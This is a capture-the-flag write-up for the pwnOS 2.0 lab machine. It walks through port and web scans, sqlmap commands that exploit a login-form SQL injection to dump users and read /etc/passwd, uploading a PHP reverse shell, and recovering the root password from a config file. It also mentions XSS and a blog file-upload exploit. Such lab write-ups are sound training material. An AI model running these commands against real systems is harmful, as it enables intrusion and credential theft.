# Topic: PWNOS 2.0

# Subject: CTF

# Reported by : Shirinov Turan


Started with `nmap` scan with the following syntax:

`nmap -vv -A -T4 -p- 10.10.10.100`

Open ports –

22 -> ssh OpenSSH 5.8p1 Debian 1ubuntu3 -> OpenSSH < 6.6 SFTP - Command
Execution

80-> http Apache httpd 2.2.17 (Ubuntu) -> Apache Struts 2.0.1 < 2.3.33 / 2.5 <
2.5.10 - Arbitrary Code Execution


![nmap](https://github.com/ShTuran/CTFs/assets/111232034/64b2cb9b-1a1d-44ce-877c-249ec23482d4)


Begin with http enum:

After that, I went to web page -> http://10.10.10.100

- Admin email -> admin@isints.com - Dan (from users table)
- Site is PHP based


  
As a second step, I run nikto to see any vulnerability regarding to
webpage:
I’ve got a lot of information I here.

![nikto](https://github.com/ShTuran/CTFs/assets/111232034/21a138d8-d65d-40ab-bb2e-0b1e40125602)


As a third step I’ve run gobuster to enumerate the directories:
Some of them were obvious, but there are some directories we’ve never seen
before.


![gobuster](https://github.com/ShTuran/CTFs/assets/111232034/73b626a2-c979-4e55-997f-07b6289c600b)


Immediately, I went to login page:

10.10.10.100/login.php is vulnerable to SQL injection which we get -> error based
slq injection lead to information disclosure and via the `sqlmap` - I find that
backend DBMS is MySQL, Linux Ubuntu 11.04, PHP 5.3.5



I have captured the request via burpsuite and put it a file called `loginpage`
Found the database name `sqlmap -r loginpage –crawl=3 --dbs` which we got ->
ch16 database name.
`sqlmap syntax` - > `sqlmap -r loginpage -crawl=3 -D ch16 –tables -dump`
Table name - `users`

Using sqlmap I have just confirmed that ‘email ’ is indeed vulnerable to SQLi
Command was used: sqlmap -u http://10.10.10.100/login.php --
data="email=test&pass=test&submit=Login&submitted=TRUE".

![sqlmap](https://github.com/ShTuran/CTFs/assets/111232034/c14f1d9c-fa90-41ca-a906-d7ffcbc1657b)


And adding –dump will gave us what we need, even though I do get the hash of
admin I could not be able to crack it. I also tried to get –os-shell but it was not
successful neither.

![sqlmap (2)](https://github.com/ShTuran/CTFs/assets/111232034/f1cf2d43-7274-4500-aa9b-c6ad25044a26)

And via the sqlmap I read the /etc/passwd:
It means that, I can read the file. The question was can I write as well? Yes. I
uploaded php-reverse shell:

![etcpasswd](https://github.com/ShTuran/CTFs/assets/111232034/c201204e-268f-44f6-9d61-168d80696be5)


Command was used: sqlmap -u http://10.10.10.100/login.php --
data="email=test&pass=test&submit=Login&submitted=TRUE" --file-write
/home/kali/phprs --file-dest /var/www/rev.php. And visited the .rev.php I do
get reverse shell. At this point, I only need to escelate the priveleges.
And listened on port 1234; got foothold.

![foothold](https://github.com/ShTuran/CTFs/assets/111232034/2da5b572-cfef-493f-b4c0-e43333aa5ff9)


After some recon – I found 2 “mysqli_connect.php” which one of them in
the /var directory and one of them in /var/www directory. The one which in
/var directory was containing the root password.


![root](https://github.com/ShTuran/CTFs/assets/111232034/cc371ab3-dd84-473c-aff9-d379aff3435b)


Additional vulnerabilites:
- 10.10.10.100/blog has xss in the `search`.

  
![Screenshot_2024-05-04_04_06_55](https://github.com/ShTuran/CTFs/assets/111232034/196f2123-cd3d-49d1-8744-c58831176be2)



- Simple PHP Blog 0.4.0 is vulnerable to file upload when I `search PHP
Blog 0.4.0` I got the meterpreter shell but I could not be able to escelate the
priveleges from there.

![ms](https://github.com/ShTuran/CTFs/assets/111232034/c8efdfa2-793d-4ed5-84f0-66e84518dfa9)



- This module combines three separate issues within The Simple PHP
Blog (<= 0.4.0) application to upload arbitrary data and thus execute a shell.
The first vulnerability exposes the hash file (password.txt) to
unauthenticated users. The second vulnerability lies within the image upload
system provided to logged-in users; there is no image validation function in
the blogger to prevent an authenticated user from uploading any file type.
The third vulnerability occurs within the blog comment functionality,
allowing arbitrary files to be deleted.
Reference of above text
https://www.rapid7.com/db/modules/exploit/unix/webapp/sphpblog_file_upload/
